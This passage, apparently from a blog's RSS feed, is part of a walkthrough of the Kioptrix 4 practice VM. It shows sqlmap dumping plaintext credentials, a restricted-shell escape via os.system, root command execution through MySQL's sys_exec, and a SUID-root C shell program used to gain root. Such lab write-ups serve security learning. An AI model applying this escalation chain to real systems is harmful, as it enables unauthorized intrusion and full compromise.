[20:48:50] [INFO] fetching number of entries for table &#39;members&#39; on database &#39;members&#39;
[20:48:50] [INFO] retrieved: 2
[20:48:50] [INFO] retrieved: 1
[20:48:50] [INFO] retrieved: MyNameIsJohn
[20:48:51] [INFO] retrieved: john
[20:48:51] [INFO] retrieved: 2
[20:48:51] [INFO] retrieved: ADGAdsafdfwt4gadfga==
[20:48:52] [INFO] retrieved: robert
[20:48:52] [INFO] analyzing table dump for possible password hashes
Database: members
Table: members
[2 entries]
+----+-----------------------+----------+
| id | password              | username |
+----+-----------------------+----------+
| 1  | MyNameIsJohn          | john     |
| 2  | ADGAdsafdfwt4gadfga== | robert   |
+----+-----------------------+----------+

[20:48:52] [INFO] Table &#39;members.members&#39; dumped to CSV file &#39;/pentest/database/sqlmap/output/192.168.95.131/dump/members/members.csv&#39;
[20:48:52] [INFO] Fetched data logged to text files under &#39;/pentest/database/sqlmap/output/192.168.95.131&#39;

[*] shutting down at 20:48:52
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;So there we have some credentials!  When I tried these on the login page, both of them worked!  However, it was a dead end, as it just showed me the usernames and passwords that I just entered.&lt;/p&gt;

&lt;p&gt;On a whim, I tried using the first login to ssh in, and it worked!&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;root@bt:/pentest/database/sqlmap# ssh john@192.168.95.131
john@192.168.95.131&#39;s password: 
Welcome to LigGoat Security Systems - We are Watching
== Welcome LigGoat Employee ==
LigGoat Shell is in place so you  don&#39;t screw up
Type &#39;?&#39; or &#39;help&#39; to get the list of allowed commands
john:~$ 
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;So I guess that was good news.  However the bad news was that it was in a form of a restricted shell.  I was not familiar with the &amp;ldquo;LigGoat Shell&amp;rdquo;.  However, it seemed somewhat limiting.  It only allowed the commands of, &amp;ldquo;cd&amp;rdquo;, &amp;ldquo;clear&amp;rdquo;, &amp;ldquo;echo&amp;rdquo;, &amp;ldquo;exit&amp;rdquo;, &amp;ldquo;help&amp;rdquo;, &amp;ldquo;ll&amp;rdquo;, &amp;ldquo;lpath&amp;rdquo;, and &amp;ldquo;ls&amp;rdquo;.  Like most other restricted shells that I&amp;rsquo;ve ran into in the past, it would not let you pipe things, or access items outside your folder.  So if you did a &amp;ldquo;ls ../&amp;rdquo;, it would not work.  However, unlike other shells, this one would actually disconnect you after a single warning of violating these rules!  Luckily, in my searching for methods to break out of a restricted shell, I found a great article on my buddy, g0tmi1k&amp;rsquo;s site, &lt;a href=&#34;http://g0tmi1k.blogspot.com/2011/08/basic-linux-privilege-escalation.html&#34;&gt;here&lt;/a&gt;.&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;john:~$ echo os.system(&#39;/bin/bash&#39;)
john@Kioptrix4:~$ 
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;I now had an unrestricted bash shell.  I was still limited to the &amp;ldquo;john&amp;rdquo; user, which seemed to have normal user privileges.  The next step was to escalate to root privileges.  I started with looking at what was running.&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;john@Kioptrix4:~$ ps aux
USER       PID %CPU %MEM    VSZ   RSS TTY      STAT START   TIME COMMAND
root         1  0.0  0.1   2844  1696 ?        Ss   Feb11   0:01 /sbin/init
root         2  0.0  0.0      0     0 ?        S&amp;lt;   Feb11   0:00 [kthreadd]
root         3  0.0  0.0      0     0 ?        S&amp;lt;   Feb11   0:00 [migration/0]
root         4  0.0  0.0      0     0 ?        S&amp;lt;   Feb11   0:00 [ksoftirqd/0]
root         5  0.0  0.0      0     0 ?        S&amp;lt;   Feb11   0:00 [watchdog/0]
root         6  0.0  0.0      0     0 ?        S&amp;lt;   Feb11   0:00 [events/0]
root         7  0.0  0.0      0     0 ?        S&amp;lt;   Feb11   0:00 [khelper]
root        41  0.0  0.0      0     0 ?        S&amp;lt;   Feb11   0:00 [kblockd/0]
root        44  0.0  0.0      0     0 ?        S&amp;lt;   Feb11   0:00 [kacpid]
root        45  0.0  0.0      0     0 ?        S&amp;lt;   Feb11   0:00 [kacpi_notify]
root       180  0.0  0.0      0     0 ?        S&amp;lt;   Feb11   0:00 [kseriod]
root       219  0.0  0.0      0     0 ?        S    Feb11   0:00 [pdflush]
root       220  0.0  0.0      0     0 ?        S    Feb11   0:00 [pdflush]
root       221  0.0  0.0      0     0 ?        S&amp;lt;   Feb11   0:00 [kswapd0]
root       263  0.0  0.0      0     0 ?        S&amp;lt;   Feb11   0:00 [aio/0]
root      1489  0.0  0.0      0     0 ?        S&amp;lt;   Feb11   0:00 [ata/0]
root      1492  0.0  0.0      0     0 ?        S&amp;lt;   Feb11   0:00 [ata_aux]
root      1501  0.0  0.0      0     0 ?        S&amp;lt;   Feb11   0:00 [scsi_eh_0]
root      1502  0.0  0.0      0     0 ?        S&amp;lt;   Feb11   0:00 [scsi_eh_1]
root      1520  0.0  0.0      0     0 ?        S&amp;lt;   Feb11   0:00 [ksuspend_usbd]
root      1526  0.0  0.0      0     0 ?        S&amp;lt;   Feb11   0:00 [khubd]
root      2401  0.0  0.0      0     0 ?        S&amp;lt;   Feb11   0:00 [scsi_eh_2]
root      2641  0.0  0.0      0     0 ?        S&amp;lt;   Feb11   0:00 [kjournald]
root      2808  0.0  0.0   2224   652 ?        S&amp;lt;s  Feb11   0:00 /sbin/udevd --daemon
root      3099  0.0  0.0      0     0 ?        S&amp;lt;   Feb11   0:00 [kgameportd]
root      3236  0.0  0.0      0     0 ?        S&amp;lt;   Feb11   0:00 [kpsmoused]
root      3974  0.0  0.0      0     0 ?        S&amp;lt;   Feb11   0:00 [btaddconn]
root      3978  0.0  0.0      0     0 ?        S&amp;lt;   Feb11   0:00 [btdelconn]
root      4614  0.0  0.0   1716   488 tty4     Ss+  Feb11   0:00 /sbin/getty 38400 tty4
root      4616  0.0  0.0   1716   488 tty5     Ss+  Feb11   0:00 /sbin/getty 38400 tty5
root      4622  0.0  0.0   1716   484 tty2     Ss+  Feb11   0:00 /sbin/getty 38400 tty2
root      4626  0.0  0.0   1716   488 tty3     Ss+  Feb11   0:00 /sbin/getty 38400 tty3
root      4630  0.0  0.0   1716   488 tty6     Ss+  Feb11   0:00 /sbin/getty 38400 tty6
syslog    4663  0.0  0.0   1936   652 ?        Ss   Feb11   0:00 /sbin/syslogd -u syslog
root      4682  0.0  0.0   1872   540 ?        S    Feb11   0:00 /bin/dd bs 1 if /proc/kmsg of /var/run/klogd/kmsg
klog      4684  0.0  0.1   3160  2064 ?        Ss   Feb11   0:00 /sbin/klogd -P /var/run/klogd/kmsg
root      4703  0.0  0.0   5316   988 ?        Ss   Feb11   0:00 /usr/sbin/sshd
root      4759  0.0  0.0   1772   524 ?        S    Feb11   0:00 /bin/sh /usr/bin/mysqld_safe
root      4876  0.0  0.1   6528  1332 ?        Ss   Feb11   0:00 /usr/sbin/nmbd -D
root      4878  0.0  0.2  10108  2544 ?        Ss   Feb11   0:00 /usr/sbin/smbd -D
root      4892  0.0  0.0  10108  1028 ?        S    Feb11   0:00 /usr/sbin/smbd -D
root      4893  0.0  0.1   8084  1336 ?        Ss   Feb11   0:00 /usr/sbin/winbindd
root      4900  0.0  0.1   8084  1160 ?        S    Feb11   0:00 /usr/sbin/winbindd
daemon    4914  0.0  0.0   1984   472 ?        Ss   Feb11   0:00 /usr/sbin/atd
root      4925  0.0  0.0   2104   884 ?        Ss   Feb11   0:00 /usr/sbin/cron
root      4947  0.0  0.5  20464  6188 ?        Ss   Feb11   0:01 /usr/sbin/apache2 -k start
www-data  4979  0.0  0.5  20596  5700 ?        S    Feb11   0:00 /usr/sbin/apache2 -k start
www-data  4980  0.0  0.5  20596  5740 ?        S    Feb11   0:00 /usr/sbin/apache2 -k start
www-data  4981  0.0  0.5  20612  5604 ?        S    Feb11   0:00 /usr/sbin/apache2 -k start
www-data  4982  0.0  0.5  20612  5684 ?        S    Feb11   0:00 /usr/sbin/apache2 -k start
www-data  4983  0.0  0.5  20612  5740 ?        S    Feb11   0:00 /usr/sbin/apache2 -k start
dhcp      4996  0.0  0.0   2440   792 ?        Ss   Feb11   0:00 dhclient eth1
root      5003  0.0  0.0   1716   492 tty1     Ss+  Feb11   0:00 /sbin/getty 38400 tty1
www-data  5015  0.0  0.5  20612  5628 ?        S    Feb11   0:00 /usr/sbin/apache2 -k start
www-data  5019  0.0  0.5  20856  5832 ?        S    Feb11   0:00 /usr/sbin/apache2 -k start
root      5486  0.0  0.0   8084   868 ?        S    Feb11   0:00 /usr/sbin/winbindd
root      5487  0.0  0.1   8092  1260 ?        S    Feb11   0:00 /usr/sbin/winbindd
root      5488  0.0  0.3  11360  3736 ?        Ss   Feb11   0:00 sshd: john [priv]
john      5490  0.0  0.1  11512  1912 ?        S    Feb11   0:00 sshd: john@pts/0 
john      5491  0.0  0.3   5888  3796 pts/0    Ss   Feb11   0:00 python /bin/kshell
john      5492  0.0  0.0   1772   488 pts/0    S    Feb11   0:00 sh -c /bin/bash
john      5493  0.0  0.2   5444  2892 pts/0    S    Feb11   0:00 /bin/bash
libuuid   6315  0.0  0.0   2004   300 ?        Ss   Feb11   0:00 uuidd
root     11581  0.5  1.9 126992 20404 ?        Sl   Feb11   0:14 /usr/sbin/mysqld --basedir=/usr --datadir=/var/lib/mysql --user=root --pid-file=/var/run/mysqld/mysqld.pid --skip-external-locking --port=330
root     11583  0.0  0.0   1700   560 ?        S    Feb11   0:00 logger -p daemon.err -t mysqld_safe -i -t mysqld
root     11663  0.0  0.0   1564   296 pts/0    S    Feb11   0:00 ./exploit
root     11664  0.0  0.0   1772   484 pts/0    S    Feb11   0:00 sh -c /bin/bash
root     11665  0.0  0.2   4924  2572 pts/0    S+   Feb11   0:00 /bin/bash
root     11725  0.0  0.3  11360  3720 ?        Ss   00:16   0:00 sshd: john [priv]
john     11727  0.0  0.1  11512  1872 ?        R    00:16   0:00 sshd: john@pts/1 
john     11728  0.0  0.3   5964  3844 pts/1    Ss   00:16   0:00 python /bin/kshell
john     11732  0.0  0.0   1772   484 pts/1    S    00:20   0:00 sh -c /bin/bash
john     11733  0.0  0.2   5432  2852 pts/1    R    00:20   0:00 /bin/bash
john     11754  0.0  0.0   2644  1008 pts/1    R+   00:22   0:00 ps aux
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;I couldn&amp;rsquo;t help but notice that MySQL was running as &amp;ldquo;root&amp;rdquo;.  This is typically a no-no, so I attempted to make it my target.  I attempted to login with the root user, and a blank password:&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;john@Kioptrix4:~$ mysql -u root -h localhost
Welcome to the MySQL monitor.  Commands end with ; or \g.
Your MySQL connection id is 4999
Server version: 5.0.51a-3ubuntu5.4 (Ubuntu)

Type &#39;help;&#39; or &#39;\h&#39; for help. Type &#39;\c&#39; to clear the buffer.

mysql&amp;gt;
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;I figured if it was running as root, I would try running some system commands.&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;mysql&amp;gt; SELECT sys_exec(&#39;touch /tmp/thisisatest&#39;);
+------------------------------------+
| sys_exec(&#39;touch /tmp/thisisatest&#39;) |
+------------------------------------+
| NULL                               | 
+------------------------------------+
1 row in set (0.00 sec)
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;And then to verify that it ran successfully:&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;john@Kioptrix4:~$ ls -al /tmp
total 12
drwxrwxrwt  3 root root 4096 2012-02-12 00:28 .
drwxr-xr-x 21 root root 4096 2012-02-06 18:41 ..
-rw-rw----  1 root root    0 2012-02-12 00:26 thisisatest
drwxr-xr-x  2 root root 4096 2012-02-11 11:07 .winbindd
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;That was a very good sign!  I decided my method of exploitation would be to use a C program, set it to SUID root, and run it.  I used this C program that I have used many times before.&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;int main()
{
    setresuid(0, 0, 0);
    setresgid(0, 0, 0);
    system( &amp;quot;/bin/bash&amp;quot; );
    return 0;
}
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;I then compiled it.  Note that gcc was not installed, and cpp gave me issues, so I compiled it on the BackTrack VM, and then SFTP&amp;rsquo;d the file over.&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;root@bt:~# gcc -o exploit exploit.c
&lt;/code&gt;&lt;/pre&gt;

&lt;pre&gt;&lt;code&gt;john@Kioptrix4:/tmp$ scp root@192.168.95.136:exploit exploit
root@192.168.95.136&#39;s password: 
exploit
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;I then used MySQL to set it to SUID and executable.  Before that, I&amp;rsquo;d have to chown it to root, so that the SUID would actually be useful.&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;john@Kioptrix4:/tmp$ mysql -u root -h localhost
Welcome to the MySQL monitor.  Commands end with ; or \g.
Your MySQL connection id is 5001
Server version: 5.0.51a-3ubuntu5.4 (Ubuntu)

Type &#39;help;&#39; or &#39;\h&#39; for help. Type &#39;\c&#39; to clear the buffer.

mysql&amp;gt; SELECT sys_exec(&#39;chown root.root /tmp/exploit&#39;);
+------------------------------------------+
| sys_exec(&#39;chown root.root /tmp/exploit&#39;) |
+------------------------------------------+
| NULL                                     | 
+------------------------------------------+
1 row in set (0.01 sec)

mysql&amp;gt; SELECT sys_exec(&#39;chmod +s,a+rwx /tmp/exploit&#39;);
+-----------------------------------------+
| sys_exec(&#39;chmod +s,a+rwx /tmp/exploit&#39;) |
+-----------------------------------------+
| NULL                                    | 
+-----------------------------------------+
1 row in set (0.00 sec)
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;The /tmp folder now looked like this:&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;john@Kioptrix4:/tmp$ ls -al
total 20
drwxrwxrwt  3 root root 4096 2012-02-12 00:31 .
drwxr-xr-x 21 root root 4096 2012-02-06 18:41 ..
-rwsrwsrwx  1 root root  166 2012-02-12 00:31 exploit
-rw-r--r--  1 john john  103 2012-02-12 00:31 exploit.c
-rw-rw----  1 root root    0 2012-02-12 00:26 thisisatest
drwxr-xr-x  2 root root 4096 2012-02-11 11:07 .winbindd
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;From there, it was just as simple as running the exploit.&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;john@Kioptrix4:/tmp$ ./exploit 
root@Kioptrix4:/tmp# id
uid=0(root) gid=0(root) groups=1001(john)
root@Kioptrix4:/tmp# whoami
root
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;And there you have it, root access!&lt;/p&gt;
</description>
    </item>
    
  </channel>
</rss>